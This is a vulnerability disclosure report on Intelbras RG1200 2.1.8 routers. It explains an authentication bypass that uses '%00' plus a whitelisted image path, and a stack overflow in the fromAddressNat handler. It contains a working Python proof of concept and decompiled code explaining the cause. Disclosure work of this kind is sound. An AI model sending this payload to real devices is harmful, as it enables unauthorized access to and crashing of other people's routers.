# CVE Report - Authentication Bypass and Stack Buffer Overflow Vulnerability in Intelbras RG1200 2.1.8 Routers (`fromAddressNat`)

## Vulnerability Title

Authentication Bypass and Stack Buffer Overflow Vulnerability in Intelbras RG1200 2.1.8 Routers (`fromAddressNat`)

## Vulnerability Description

Intelbras RG1200 firmware 2.1.8 contains an authentication bypass in the request dispatch chain (`R7WebsSecurityHandler` + `websFormHandler`) caused by inconsistent use of the raw (non-decoded) URL versus the decoded path. Remote unauthenticated attackers can bypass authentication by crafting a URL containing `%00` and a whitelisted substring (e.g., `img/main-logo.png`) in the raw URL so that the security handler matches the whitelist while the form dispatcher resolves the decoded/truncated path to a protected `/goform` handler.

After authentication bypass, an attacker can trigger a stack buffer overflow in `fromAddressNat`. The handler formats user-controlled strings into fixed-size stack buffers using `sprintf` without bounds checking.

## POC

```py
import requests
import sys


def exploit(target_ip, port=80, cookie="SESSION=<REPLACE>"):
  base = f"http://{target_ip}:{port}"
  url = f"{base}/goform/fromAddressNat%00img/main-logo.png"

  data = {
    "entrys": "A" * 1000,
    "mitInterface": "A" * 1000,
    "page": "1",
  }

  headers = {
    "Cookie": cookie,
  }

  r = requests.post(url, data=data, headers=headers, timeout=10)
  print("status:", r.status_code)
  print(r.text[:2000])


if __name__ == "__main__":
  if len(sys.argv) < 2:
    print("usage: python poc.py <target_ip> [port]")
    sys.exit(1)
  ip = sys.argv[1]
  port = int(sys.argv[2]) if len(sys.argv) > 2 else 80
  exploit(ip, port=port)
```

## Cause Analysis

### 1. Authentication Bypass — Raw URL vs Decoded Path Inconsistency

The HTTP request parsing logic in `websParseFirst` (0x42ea1c) stores the raw request URL into `wp->url` (not URL-decoded), while `wp->path` is derived from a decoded buffer produced by `websDecodeUrl` → `websUrlParse`:

```c
// websParseFirst (0x42ea1c) — sets wp->url = raw, wp->path = decoded
int __cdecl websParseFirst(webs_t wp, char_t *text)
{
    url = strtok(0, " \t\n");                         // raw URL from HTTP request line
    if ( websUrlParse(url, &buf, &host, &path, &port, &query, &proto, 0, &ext) >= 0 )
    {
        wp->url = bstrdup(url);      // ← raw URL, NOT decoded
        wp->path = bstrdup(path);    // ← decoded path from websDecodeUrl
        // ...
    }
}
```

In `R7WebsSecurityHandler` (0x434c34), the whitelist check is performed using `strstr(url, ...)` on the **raw** `url` parameter (which is `wp->url`). By crafting a raw URL such as `/goform/fromAddressNat%00img/main-logo.png`, the security handler matches the whitelisted substring and returns 0 (allow) without enforcing authentication:

```c
// R7WebsSecurityHandler (0x434c34) — whitelist check on raw URL
if ( !strncmp(url, "/public/", 8u)
  || !strncmp(url, "/lang/", 6u)
  || strstr(url, "img/main-logo.png")    // ← BYPASS: matches %00img/main-logo.png in raw URL
  || strstr(url, "reasy-ui-1.0.3.js")
  // ...
{
    return 0;  // ← Authentication bypassed
}
```

Meanwhile, `websDecodeUrl` (0x430ebc) decodes `%00` to a null byte, causing `websFormHandler` (0x415710) to receive the **decoded** path `/goform/fromAddressNat` and dispatch to the handler.

### 2. Stack Buffer Overflow — Unbounded sprintf in fromAddressNat

`fromAddressNat` (0x484aa0) obtains `str` and `ifindex` via `websGetVar`, then formats them into a 512-byte stack buffer via `sprintf` without bounds checking. A second `sprintf` for `page` also overflows a 256-byte buffer:

```c
// fromAddressNat (0x484aa0)
void __cdecl fromAddressNat(webs_t wp, char_t *path, char_t *query)
{
    const char *ifindex;
    const char *page;
    const char *str;
    char_t gotopage[256];     // ← 256-byte stack buffer
    char_t list[512];         // ← 512-byte stack buffer
    char param_str[260];

    memset(gotopage, 0, sizeof(gotopage));
    memset(list, 0, sizeof(list));
    str = websGetVar(wp, "entrys", byte_4ED6B0);
    ifindex = websGetVar(wp, "mitInterface", byte_4ED6B0);
    sprintf(list, "%s;%s", str, ifindex);                          // ← OVERFLOW: two user inputs into 512-byte buffer
    save_list_data("adv.addrnat", list, 126);
    page = websGetVar(wp, "page", "1");
    sprintf(gotopage, "advance/addressNatList.asp?page=%s", page); // ← OVERFLOW: page into 256-byte buffer
    // ...
    websRedirect(wp, gotopage);
}
```

Two 1000-byte inputs for `entrys` and `mitInterface` produce a 2001+ byte string that overflows the 512-byte `list` buffer. Similarly, a long `page` value overflows the 256-byte `gotopage` buffer.



